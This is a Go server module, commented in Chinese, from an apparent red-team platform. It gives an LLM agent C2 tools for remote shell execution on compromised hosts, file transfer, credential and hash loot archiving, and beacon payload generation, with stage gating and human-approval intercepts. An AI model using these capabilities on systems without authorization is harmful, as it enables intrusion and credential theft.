package server

// C2 中心 × agent 集成(契约 §7)。8 个后渗透工具:
//
//	c2_session_list / c2_session_info                    读会话面
//	c2_exec                                              命令-响应式 shell(带 stage 门禁+拦截)
//	c2_upload / c2_download                              文件往返(≤1MB/预览 2KB)
//	c2_loot_record / c2_loot_search                      战利品归档与检索
//	c2_payload_create                                    载荷生成
//
// 仿 vps_agent.go:roTool/wrTool + objSchema/strParam + jsonResult 造工具;
// seedC2AgentTools 用 SeedToolWithStage(..., ["worker"], "post") 播种(stage=post
// 才可绑定),由 initC2(New 里)调用一次;hostTools 里追加 c2AgentTools 一行注入。
//
// 铁律(契约 §0/§7):
//   - stage 门禁 fail-closed:工具内取 RunInfoFrom(ctx).TaskID 查平台任务,
//     stage ≠ post 一律拒绝(包括查不到任务/任务不在内存的情况)。
//   - 新代码禁止 os/exec:一切执行发生在 beacon 目标机上,server 只写任务队列。
//   - 会话凭证/loot 明文只在内存;响应不回显监听器 key。

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/agent"
	pgdb "github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/intercept"
	actool "github.com/Autumn-27/norma/tool"
)

// c2_exec 的执行参数(契约 §7:timeout_sec ≤300,默认 60;输出截 8KB)。
const (
	c2ExecMaxTimeoutSec  = 300
	c2ExecDefaultTimeout = 60
	c2ExecOutputLimit    = 8 << 10
	// c2UploadMaxBytes 是 agent 上传内容的解码后上限;下载预览截 2KB。
	c2UploadMaxBytes    = 1 << 20
	c2DownloadPreviewKB = 2 << 10
	// 等待 beacon 往返的轮询间隔与上限(命令-响应式通道,队列+长轮询有固有延迟,
	// 等待窗口在工具超时之上多留 15s 余量)。
	c2PollInterval = 700 * time.Millisecond
	c2ExecGrace    = 15 * time.Second
	c2UploadWait   = 120 * time.Second
	c2DownloadWait = 300 * time.Second
)

// ---- 门禁与公共小件 ----

// c2RequirePostStage stage 门禁(契约 §7,fail-closed):取当前 run 的平台任务,
// stage ≠ post(含任务不在内存/非任务上下文)一律拒绝。返回空串 = 放行。
func (s *Server) c2RequirePostStage(ctx context.Context, tool string) string {
	taskID := agent.RunInfoFrom(ctx).TaskID
	if taskID <= 0 {
		return fmt.Sprintf("%s 只能在 post(后渗透)阶段任务的 agent 里调用(当前不是任务执行上下文);"+
			"C2 是后渗透指挥面,请先在授权的后渗透任务中使用", tool)
	}
	t, ok := s.m.Task(strconv.FormatInt(taskID, 10))
	if !ok {
		return fmt.Sprintf("%s 拒绝执行:任务 #%d 不在运行内存中(fail-closed,宁可拒绝也不放行)", tool, taskID)
	}
	if t.Stage != "post" {
		return fmt.Sprintf("%s 仅对 post(后渗透)阶段任务开放(当前任务 #%d stage=%s)。"+
			"C2 会话控制是后渗透能力,前置阶段(侦察/利用)请勿尝试", tool, taskID, t.Stage)
	}
	return ""
}

// c2ToolSession 校验并读会话(工具入参 session_id;不存在报错)。
func (s *Server) c2ToolSession(sessionID int64) (*pgdb.C2Session, error) {
	if sessionID <= 0 {
		return nil, fmt.Errorf("session_id 必填")
	}
	m, err := s.m.PG().GetC2Session(sessionID)
	if err != nil {
		return nil, err
	}
	if m == nil {
		return nil, fmt.Errorf("会话 #%d 不存在(可用 c2_session_list 查看在线会话)", sessionID)
	}
	return m, nil
}

// c2ExecIntercept 按 guard.applyIntercept 的模式对将下发的命令做拦截评估
// (只走 Match 硬规则;LLM Judge(interceptor.Judge)本期不接——ask 语义在这里是
// 「提交审批、本调用不执行」,硬规则已覆盖管控面,接线留二期)。
// 返回 (blocked, modelText):blocked=true 时调用方原样把 modelText 返回给模型。
func (s *Server) c2ExecIntercept(ctx context.Context, command string) (bool, string) {
	ic := s.m.interceptor
	if ic == nil || !ic.IsToolEnabled("c2_exec") {
		return false, ""
	}
	input, _ := json.Marshal(map[string]string{"command": command})
	ictx := intercept.WithCall(ctx, "c2_exec", input)
	dec, matched := ic.Match(ictx, "c2_exec", input)
	if !matched {
		return false, "" // 无规则命中(或任务关了拦截):放行,同 guard 语义
	}
	convID := intercept.ConvIDFromContext(ctx)
	switch dec.Action {
	case "deny":
		ic.Log(ictx, convID, dec, "c2_exec", input, "denied")
		return true, "【ARTEX 平台管控·非目标防御】此 C2 命令被平台拦截规则 «" + dec.RuleName +
			"» 否决。原因:" + dec.Message + "。此操作被禁止;平台拦的是行为类别,不是目标的防御," +
			"换写法/换编码绕不过,请改走其它授权手段。"
	case "ask":
		// 提交人工审批(本调用一律不执行)。HandleAsk 会阻塞到人决定,这里在后台
		// goroutine 里只负责把待审批记录立起来(审批结果不由本工具消费;人放行后
		// 需重新发起同样的调用)。WithoutCancel 保留任务上下文值(待审批页可溯源),
		// 24h 无人处理自动落 denied,goroutine 不泄漏。
		go func(dec intercept.Decision, input []byte, convID int64) {
			askCtx, cancel := context.WithTimeout(context.WithoutCancel(ctx), 24*time.Hour)
			defer cancel()
			_ = ic.HandleAsk(askCtx, convID, dec, "c2_exec", input)
		}(dec, input, convID)
		return true, "已提交人工审批(管控规则 «" + dec.RuleName +
			"» 要求人工放行),本次调用未执行任何命令。用户在「安全管控 → 待审批」处理并放行后," +
			"请重新发起同样的调用;在此之前请勿用其它方式执行该命令。"
	case "allow":
		ic.Log(ictx, convID, dec, "c2_exec", input, "allowed")
	case "flag":
		ic.Log(ictx, convID, dec, "c2_exec", input, "flagged")
	}
	return false, ""
}

// c2WaitTaskTerminal 轮询任务到终态。返回 (任务快照, err):err 非 nil = 调用被取消;
// 超时返回当前快照(status 非终态),由调用方给提示。
func (s *Server) c2WaitTaskTerminal(ctx context.Context, taskID int64, wait time.Duration) (*pgdb.C2Task, error) {
	deadline := time.Now().Add(wait)
	for {
		t, err := s.m.PG().GetC2Task(taskID)
		if err != nil {
			return nil, err
		}
		if t != nil && (t.Status == pgdb.C2TaskStatusDone || t.Status == pgdb.C2TaskStatusError) {
			return t, nil
		}
		if ctx.Err() != nil {
			return t, ctx.Err()
		}
		if !time.Now().Before(deadline) {
			return t, nil
		}
		select {
		case <-ctx.Done():
			return t, ctx.Err()
		case <-time.After(c2PollInterval):
		}
	}
}

// c2WaitTransferTerminal 轮询传输到终态(语义同上)。
func (s *Server) c2WaitTransferTerminal(ctx context.Context, transferID int64, wait time.Duration) (*pgdb.C2Transfer, error) {
	deadline := time.Now().Add(wait)
	for {
		tr, err := s.m.PG().GetC2Transfer(transferID)
		if err != nil {
			return nil, err
		}
		if tr != nil && (tr.Status == "done" || tr.Status == "error") {
			return tr, nil
		}
		if ctx.Err() != nil {
			return tr, ctx.Err()
		}
		if !time.Now().Before(deadline) {
			return tr, nil
		}
		select {
		case <-ctx.Done():
			return tr, ctx.Err()
		case <-time.After(c2PollInterval):
		}
	}
}

// c2QueueTransferTask 建「传输+任务」组合(beacon 协议:任务 input 携带
// transfer_id/remote_path,传输行回挂任务 id)。返回 (transferID, taskID)。
func (s *Server) c2QueueTransferTask(sessionID int64, direction, remotePath string, size int64, actor, createdBy string) (int64, int64, error) {
	transferID, err := s.m.PG().CreateC2Transfer(pgdb.C2TransferInput{
		SessionID: sessionID, Direction: direction, RemotePath: remotePath, Size: size,
	})
	if err != nil {
		return 0, 0, err
	}
	kind := pgdb.C2TaskKindUpload
	if direction == pgdb.C2TransferDown {
		kind = pgdb.C2TaskKindDownload
	}
	taskID, err := s.m.PG().CreateC2Task(pgdb.C2TaskInput{
		SessionID: sessionID, Kind: kind,
		Input: c2TransferTaskInput(transferID, remotePath), Actor: actor, CreatedBy: createdBy,
	})
	if err != nil {
		_ = s.m.PG().UpdateC2Transfer(transferID, "error", 0, -1, "", err.Error())
		return 0, 0, err
	}
	if err := s.m.PG().SetC2TransferTask(transferID, taskID); err != nil {
		log.Printf("[c2-agent] 传输 #%d 回挂任务失败: %v", transferID, err)
	}
	s.c2NotifySession(sessionID)
	return transferID, taskID, nil
}

// ---- 工具集 ----

// c2AgentTools 返回 C2 agent 工具(8 个)。经 hostTools 注入候选集,
// tools 表按绑定过滤(默认只绑 worker、stage=post)。
func (s *Server) c2AgentTools() []actool.CoreTool {
	return []actool.CoreTool{
		s.toolC2SessionList(),
		s.toolC2SessionInfo(),
		s.toolC2Exec(),
		s.toolC2Upload(),
		s.toolC2Download(),
		s.toolC2LootRecord(),
		s.toolC2LootSearch(),
		s.toolC2PayloadCreate(),
	}
}

// seedC2AgentTools 把 8 个 C2 工具 seed 进 tools 表(首插入 only,默认绑 worker,
// stage=post——post 门禁同时落在工具绑定与工具内 fail-closed 双保险)。
func (s *Server) seedC2AgentTools() {
	if s.m == nil || s.m.PG() == nil {
		return
	}
	for _, t := range s.c2AgentTools() {
		schema, _ := json.Marshal(t.InputSchema())
		agents, _ := json.Marshal([]string{"worker"})
		if err := s.m.PG().SeedToolWithStage(t.Name(), t.Description(), schema, agents, "post"); err != nil {
			log.Printf("[c2-agent] seed %s 失败: %v", t.Name(), err)
		}
	}
}

// toolC2SessionList 列 C2 会话。
func (s *Server) toolC2SessionList() actool.CoreTool {
	return roTool("c2_session_list",
		"列出 C2(beacon)会话:每条含 id/status(online|offline|dead)/hostname/username/os/task_id/"+
			"last_seen 等。按最近心跳倒序,最多 100 条。后续用 c2_session_info 看详情、c2_exec 下命令。",
		objSchema(map[string]any{
			"status": strParam("可选:按状态过滤 online/offline/dead"),
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_session_list"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				Status string `json:"status"`
			}
			_ = json.Unmarshal(in, &a)
			a.Status = strings.TrimSpace(a.Status)
			if a.Status != "" && !pgdb.ValidC2SessionStatus(a.Status) {
				return actool.Errorf(fmt.Sprintf("无效状态过滤 %q(仅 online/offline/dead)", a.Status)), nil
			}
			rows, _, err := s.m.PG().ListC2Sessions(pgdb.C2SessionFilter{Status: a.Status, Limit: 100})
			if err != nil {
				return actool.Errorf("查询会话失败: " + err.Error()), nil
			}
			out := make([]map[string]any, 0, len(rows))
			for _, m := range rows {
				out = append(out, map[string]any{
					"id": m.ID, "status": m.Status, "hostname": m.Hostname,
					"username": m.Username, "elevated": m.Elevated,
					"os": m.OS, "arch": m.Arch, "task_id": m.TaskID,
					"listener_id": m.ListenerID, "sleep_sec": m.SleepSec,
					"last_seen": m.LastSeen.Format(time.RFC3339),
				})
			}
			return jsonResult(map[string]any{"sessions": out, "total": len(out)})
		})
}

// toolC2SessionInfo 会话档案 + meta + 任务计数。
func (s *Server) toolC2SessionInfo() actool.CoreTool {
	return roTool("c2_session_info",
		"查看一个 C2 会话的完整档案:主机名/用户/权限/系统/架构/内网 IP/进程/PID/心跳/"+
			"sleep/绑定任务/meta(beacon 上报的扩展信息)/该会话的任务计数(排队/在途/完成/失败)。",
		objSchema(map[string]any{
			"session_id": strParam("会话 id(c2_session_list 返回的 id)"),
		}, "session_id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_session_info"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				SessionID json.RawMessage `json:"session_id"`
			}
			_ = json.Unmarshal(in, &a)
			m, err := s.c2ToolSession(parseProfileID(a.SessionID))
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			queued, sent, done, failed, err := s.m.PG().CountC2TasksByStatus(m.ID)
			if err != nil {
				return actool.Errorf("任务计数失败: " + err.Error()), nil
			}
			return jsonResult(map[string]any{
				"id": m.ID, "listener_id": m.ListenerID, "beacon_uid": m.BeaconUID,
				"hostname": m.Hostname, "username": m.Username, "elevated": m.Elevated,
				"os": m.OS, "arch": m.Arch, "local_ips": m.LocalIPs,
				"pid": m.PID, "process": m.Process,
				"sleep_sec": m.SleepSec, "jitter_pct": m.JitterPct,
				"task_id": m.TaskID, "status": m.Status, "labels": m.Labels, "meta": m.Meta,
				"first_seen": m.FirstSeen.Format(time.RFC3339),
				"last_seen":  m.LastSeen.Format(time.RFC3339),
				"tasks":      map[string]any{"queued": queued, "sent": sent, "done": done, "error": failed},
			})
		})
}

// toolC2Exec 下发 shell 命令并等结果(stage 门禁 + 拦截决策 + 轮询终态)。
func (s *Server) toolC2Exec() actool.CoreTool {
	return wrTool("c2_exec",
		"在指定 C2 会话(已上线主机)上执行一条 shell 命令并等待回传结果(Linux 走 sh -c,"+
			"Windows 走 powershell -NoProfile -Command;stdout+stderr 合并)。"+
			"命令-响应式通道:每条命令独立会话,环境变量/后台进程不跨调用保留。"+
			"仅 post(后渗透)阶段任务可用;命令会过平台拦截规则(deny 拒绝/ask 转人工审批)。",
		objSchema(map[string]any{
			"session_id":  strParam("会话 id(c2_session_list 返回的 id)"),
			"command":     strParam("要执行的命令(合并 stdout/stderr,上限 1MB 回传)"),
			"timeout_sec": strParam("可选:等待结果超时秒数(≤300,默认 60)"),
		}, "session_id", "command"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_exec"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				SessionID  json.RawMessage `json:"session_id"`
				Command    string          `json:"command"`
				TimeoutSec int             `json:"timeout_sec"`
			}
			_ = json.Unmarshal(in, &a)
			m, err := s.c2ToolSession(parseProfileID(a.SessionID))
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			command := strings.TrimSpace(a.Command)
			if command == "" {
				return actool.Errorf("command 不能为空"), nil
			}
			timeoutSec := a.TimeoutSec
			if timeoutSec <= 0 {
				timeoutSec = c2ExecDefaultTimeout
			}
			if timeoutSec > c2ExecMaxTimeoutSec {
				timeoutSec = c2ExecMaxTimeoutSec
			}
			// 下发前过平台拦截(deny 拒绝 / ask 转人工审批,均不落任务)。
			if blocked, text := s.c2ExecIntercept(ctx, command); blocked {
				return actool.Errorf(text), nil
			}
			offlineHint := ""
			if m.Status != pgdb.C2SessionStatusOnline {
				offlineHint = fmt.Sprintf("(注意:该会话当前 %s,命令会排队等 beacon 回连后执行)", m.Status)
			}
			// 任务 input 按 beacon 解析约定装 JSON(shell={"command":…},见 c2center.Task 注)。
			cmdJSON, _ := json.Marshal(map[string]any{"command": command})
			taskID, err := s.m.PG().CreateC2Task(pgdb.C2TaskInput{
				SessionID: m.ID, Kind: pgdb.C2TaskKindShell, Input: string(cmdJSON),
				Actor: pgdb.C2TaskActorAgent, CreatedBy: "c2_exec",
			})
			if err != nil {
				return actool.Errorf("建任务失败: " + err.Error()), nil
			}
			s.c2NotifySession(m.ID)
			task, err := s.c2WaitTaskTerminal(ctx, taskID, time.Duration(timeoutSec)*time.Second+c2ExecGrace)
			if err != nil {
				return actool.Errorf(fmt.Sprintf("任务 #%d 已下发但等待被取消(%v);结果可稍后从任务流水查看", taskID, err)), nil
			}
			if task == nil {
				return actool.Errorf(fmt.Sprintf("任务 #%d 状态读取失败", taskID)), nil
			}
			out, truncated := truncateVPSOutput([]byte(task.Output), c2ExecOutputLimit)
			if truncated {
				out += fmt.Sprintf("\n…[输出超过 %d KB 已截断;完整输出可在 C2 详情页任务流水下载]", c2ExecOutputLimit/1024)
			}
			res := map[string]any{
				"task_id": task.ID, "session_id": m.ID, "status": task.Status,
				"output": out, "truncated": truncated, "error": task.Error,
			}
			if task.Status != pgdb.C2TaskStatusDone && task.Status != pgdb.C2TaskStatusError {
				res["hint"] = fmt.Sprintf("等待 %d 秒未到终态(当前 %s)%s;beacon 心跳间隔 %d 秒,"+
					"可稍后用 c2_session_info 看任务计数,或直接重试", timeoutSec, task.Status, offlineHint, m.SleepSec)
			} else if offlineHint != "" {
				res["hint"] = "命令在 beacon 回连后执行" + offlineHint
			}
			return jsonResult(res)
		})
}

// toolC2Upload 上传内容到目标机(≤1MB,等传输终态)。
func (s *Server) toolC2Upload() actool.CoreTool {
	return wrTool("c2_upload",
		"把一段内容(base64)上传到指定 C2 会话主机的 remote_path(完整远端文件路径)。"+
			"解码后上限 1MB;大文件请在 C2 页面走文件上传。返回传输 id 与终态。",
		objSchema(map[string]any{
			"session_id":  strParam("会话 id"),
			"remote_path": strParam("目标机上的完整文件路径(如 C:\\Users\\Public\\a.txt 或 /tmp/a)"),
			"content_b64": strParam("文件内容的 base64 编码(解码后 ≤1MB)"),
		}, "session_id", "remote_path", "content_b64"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_upload"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				SessionID  json.RawMessage `json:"session_id"`
				RemotePath string          `json:"remote_path"`
				ContentB64 string          `json:"content_b64"`
			}
			_ = json.Unmarshal(in, &a)
			m, err := s.c2ToolSession(parseProfileID(a.SessionID))
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			remotePath := strings.TrimSpace(a.RemotePath)
			if remotePath == "" {
				return actool.Errorf("remote_path 必填(目标机上的完整文件路径)"), nil
			}
			data, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(a.ContentB64))
			if derr != nil {
				return actool.Errorf("content_b64 不是合法 base64: " + derr.Error()), nil
			}
			if len(data) == 0 {
				return actool.Errorf("content_b64 解码后为空"), nil
			}
			if len(data) > c2UploadMaxBytes {
				return actool.Errorf(fmt.Sprintf("内容解码后 %d 字节,超过 1MB 上限;大文件请在 C2 页面上传", len(data))), nil
			}
			transferID, taskID, err := s.c2QueueTransferTask(m.ID, pgdb.C2TransferUp, remotePath,
				int64(len(data)), pgdb.C2TaskActorAgent, "c2_upload")
			if err != nil {
				return actool.Errorf("建传输失败: " + err.Error()), nil
			}
			// 平台侧 blob 落盘(文件名带数字 id,beacon pull 分片从这里读)。
			blobPath := filepath.Join(c2BlobDir(s.m.dir, "uploads"), fmt.Sprintf("%d.bin", transferID))
			if err := os.MkdirAll(filepath.Dir(blobPath), 0o755); err != nil {
				_ = s.m.PG().UpdateC2Transfer(transferID, "error", 0, -1, "", "建上传目录失败: "+err.Error())
				return actool.Errorf("建上传目录失败: " + err.Error()), nil
			}
			if err := os.WriteFile(blobPath, data, 0o600); err != nil {
				_ = s.m.PG().UpdateC2Transfer(transferID, "error", 0, -1, "", "写上传 blob 失败: "+err.Error())
				return actool.Errorf("写上传 blob 失败: " + err.Error()), nil
			}
			if err := s.m.PG().UpdateC2Transfer(transferID, "queued", 0, -1, blobPath, ""); err != nil {
				log.Printf("[c2-agent] 传输 #%d 记录 blob 路径失败: %v", transferID, err)
			}
			tr, err := s.c2WaitTransferTerminal(ctx, transferID, c2UploadWait)
			if err != nil {
				return actool.Errorf(fmt.Sprintf("传输 #%d 已排队但等待被取消(%v);可在 C2 详情页传输列表跟踪", transferID, err)), nil
			}
			if tr == nil {
				return actool.Errorf(fmt.Sprintf("传输 #%d 状态读取失败", transferID)), nil
			}
			res := map[string]any{
				"transfer_id": tr.ID, "task_id": taskID, "status": tr.Status,
				"remote_path": tr.RemotePath, "size": tr.Size, "done_size": tr.DoneSize, "error": tr.Error,
			}
			if tr.Status != "done" {
				res["hint"] = fmt.Sprintf("传输未完成(当前 %s);beacon 心跳间隔 %d 秒,可稍后查传输列表", tr.Status, m.SleepSec)
			}
			return jsonResult(res)
		})
}

// toolC2Download 从目标机取文件(等传输终态,返回本地路径 + 文本前 2KB 预览)。
func (s *Server) toolC2Download() actool.CoreTool {
	return wrTool("c2_download",
		"从指定 C2 会话主机下载一个远端文件到平台(beacon 推回分片,平台落盘)。"+
			"完成后返回本地保存路径、大小与文本前 2KB 预览;二进制文件请用平台文件下载。",
		objSchema(map[string]any{
			"session_id":  strParam("会话 id"),
			"remote_path": strParam("目标机上的完整文件路径"),
		}, "session_id", "remote_path"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_download"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				SessionID  json.RawMessage `json:"session_id"`
				RemotePath string          `json:"remote_path"`
			}
			_ = json.Unmarshal(in, &a)
			m, err := s.c2ToolSession(parseProfileID(a.SessionID))
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			remotePath := strings.TrimSpace(a.RemotePath)
			if remotePath == "" {
				return actool.Errorf("remote_path 必填"), nil
			}
			transferID, _, err := s.c2QueueTransferTask(m.ID, pgdb.C2TransferDown, remotePath,
				0, pgdb.C2TaskActorAgent, "c2_download")
			if err != nil {
				return actool.Errorf("建传输失败: " + err.Error()), nil
			}
			tr, err := s.c2WaitTransferTerminal(ctx, transferID, c2DownloadWait)
			if err != nil {
				return actool.Errorf(fmt.Sprintf("传输 #%d 已排队但等待被取消(%v);可在 C2 详情页跟踪", transferID, err)), nil
			}
			if tr == nil {
				return actool.Errorf(fmt.Sprintf("传输 #%d 状态读取失败", transferID)), nil
			}
			res := map[string]any{
				"transfer_id": tr.ID, "status": tr.Status,
				"remote_path": tr.RemotePath, "size": tr.Size, "done_size": tr.DoneSize, "error": tr.Error,
			}
			if tr.Status != "done" {
				res["hint"] = fmt.Sprintf("下载未完成(当前 %s);beacon 心跳间隔 %d 秒,可稍后查传输列表", tr.Status, m.SleepSec)
				return jsonResult(res)
			}
			// 产物读取(路径只由服务端构造,再兜一道包含关系校验)。
			localPath := tr.LocalPath
			res["local_path"] = localPath
			if localPath == "" || !c2PathUnder(localPath, c2BlobDir(s.m.dir, "downloads")) {
				res["error"] = "产物路径缺失或越界,请用平台传输列表下载"
				return jsonResult(res)
			}
			data, rerr := os.ReadFile(localPath)
			if rerr != nil {
				res["error"] = "产物文件读取失败(可能已被清理): " + rerr.Error()
				return jsonResult(res)
			}
			res["size"] = int64(len(data))
			preview, _ := truncateVPSOutput(data, c2DownloadPreviewKB)
			res["preview"] = preview
			if len(data) > c2DownloadPreviewKB {
				res["hint"] = fmt.Sprintf("预览截前 %d KB;完整文件在 %s", c2DownloadPreviewKB/1024, localPath)
			}
			return jsonResult(res)
		})
}

// toolC2LootRecord 记战利品(credential/hash 自动加密)。
func (s *Server) toolC2LootRecord() actool.CoreTool {
	return wrTool("c2_loot_record",
		"把后渗透收获的战利品(凭据/哈希/文件线索等)归档到平台战利品库。"+
			"credential/hash 类内容自动加密存储,列表不回显,只在详情接口解密。",
		objSchema(map[string]any{
			"session_id": strParam("会话 id(战利品来源会话)"),
			"kind":       strParam("类型:credential|hash|file|screenshot|other"),
			"name":       strParam("名称(如 «域管凭据» «lsass dump»)"),
			"content":    strParam("内容(credential/hash 将加密存储;file/screenshot 可空,说明写 name)"),
		}, "session_id", "kind", "name"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_loot_record"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				SessionID json.RawMessage `json:"session_id"`
				Kind      string          `json:"kind"`
				Name      string          `json:"name"`
				Content   string          `json:"content"`
			}
			_ = json.Unmarshal(in, &a)
			m, err := s.c2ToolSession(parseProfileID(a.SessionID))
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			a.Kind = strings.TrimSpace(a.Kind)
			if !pgdb.ValidC2LootKind(a.Kind) {
				return actool.Errorf(fmt.Sprintf("无效类型 %q(仅 credential/hash/file/screenshot/other)", a.Kind)), nil
			}
			if strings.TrimSpace(a.Name) == "" {
				return actool.Errorf("name 必填"), nil
			}
			content := a.Content
			encrypted := false
			if content != "" && pgdb.LootContentEncrypted(a.Kind) {
				sealed, serr := s.sealC2Secret([]byte(content))
				if serr != nil {
					return actool.Errorf("加密战利品内容失败: " + serr.Error()), nil
				}
				content = string(sealed)
				encrypted = true
			}
			id, err := s.m.PG().CreateC2Loot(pgdb.C2LootInput{
				SessionID: m.ID, Kind: a.Kind, Name: a.Name, Content: content,
			})
			if err != nil {
				return actool.Errorf("归档失败: " + err.Error()), nil
			}
			return jsonResult(map[string]any{
				"id": id, "session_id": m.ID, "kind": a.Kind, "name": a.Name,
				"encrypted": encrypted,
				"hint":      "已入库;可在 C2 战利品页查看(credential/hash 详情需解密)",
			})
		})
}

// toolC2LootSearch 查战利品库(列表口径:content 不回显,只给 has_content)。
func (s *Server) toolC2LootSearch() actool.CoreTool {
	return roTool("c2_loot_search",
		"在平台战利品库中检索历史归档(名称/来源路径模糊匹配,可按类型过滤)。"+
			"返回 id/类型/名称/来源路径/会话/时间与 has_content 标记;内容本体不在列表回显"+
			"(credential/hash 加密存储),需要内容时告知用户到 C2 战利品页查看详情。",
		objSchema(map[string]any{
			"q":    strParam("可选:关键字(匹配名称/来源路径)"),
			"kind": strParam("可选:credential|hash|file|screenshot|other"),
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_loot_search"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				Q    string `json:"q"`
				Kind string `json:"kind"`
			}
			_ = json.Unmarshal(in, &a)
			a.Kind = strings.TrimSpace(a.Kind)
			if a.Kind != "" && !pgdb.ValidC2LootKind(a.Kind) {
				return actool.Errorf(fmt.Sprintf("无效类型 %q", a.Kind)), nil
			}
			items, total, err := s.m.PG().ListC2Loot(pgdb.C2LootFilter{
				Kind: a.Kind, Q: strings.TrimSpace(a.Q), Limit: 50,
			})
			if err != nil {
				return actool.Errorf("检索失败: " + err.Error()), nil
			}
			out := make([]map[string]any, 0, len(items))
			for _, lo := range items {
				out = append(out, map[string]any{
					"id": lo.ID, "kind": lo.Kind, "name": lo.Name,
					"source_path": lo.SourcePath, "session_id": lo.SessionID,
					"has_content": lo.HasContent,
					"created_at":  lo.CreatedAt.Format(time.RFC3339),
				})
			}
			return jsonResult(map[string]any{"loot": out, "total": total})
		})
}

// toolC2PayloadCreate 生成载荷(与页面同一条生成路径)。
func (s *Server) toolC2PayloadCreate() actool.CoreTool {
	return wrTool("c2_payload_create",
		"为指定 C2 监听器生成 beacon 载荷(ps1/bash/py/gosrc 源码包),返回载荷 id、"+
			"目标机一行执行命令(oneliner)与投递 URL。监听器必须已配置回调地址(callback)且在运行中才能投递。",
		objSchema(map[string]any{
			"listener_id": strParam("监听器 id(c2 监听器页/平台数据库中的 id)"),
			"format":      strParam("载荷格式:ps1|bash|py|gosrc"),
			"target":      strParam("可选:目标平台 windows|linux|macos|cross(默认 windows)"),
			"name":        strParam("可选:载荷名称(默认 监听器名-格式-目标)"),
		}, "listener_id", "format"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if msg := s.c2RequirePostStage(ctx, "c2_payload_create"); msg != "" {
				return actool.Errorf(msg), nil
			}
			if s.m == nil || s.m.PG() == nil {
				return actool.Errorf("数据库未初始化"), nil
			}
			var a struct {
				ListenerID json.RawMessage `json:"listener_id"`
				Format     string          `json:"format"`
				Target     string          `json:"target"`
				Name       string          `json:"name"`
			}
			_ = json.Unmarshal(in, &a)
			pl, deliverURL, err := s.c2GeneratePayload(parseProfileID(a.ListenerID),
				strings.TrimSpace(a.Format), strings.TrimSpace(a.Target), strings.TrimSpace(a.Name), "agent")
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			running := false
			if mgr := C2Manager(); mgr != nil {
				running = mgr.ListenerRunning(pl.ListenerID)
			}
			hint := "监听器未运行,载荷生成成功但暂不可投递;请先在 C2 监听器页启动监听器"
			if running {
				hint = "监听器运行中;目标机执行 oneliner(或取回投递 URL 内容执行)即可上线"
			}
			return jsonResult(map[string]any{
				"id": pl.ID, "name": pl.Name, "format": pl.Format, "target": pl.Target,
				"oneliner": pl.Oneliner, "deliver_url": deliverURL,
				"sha256": pl.SHA256, "size": pl.Size, "listener_running": running, "hint": hint,
			})
		})
}
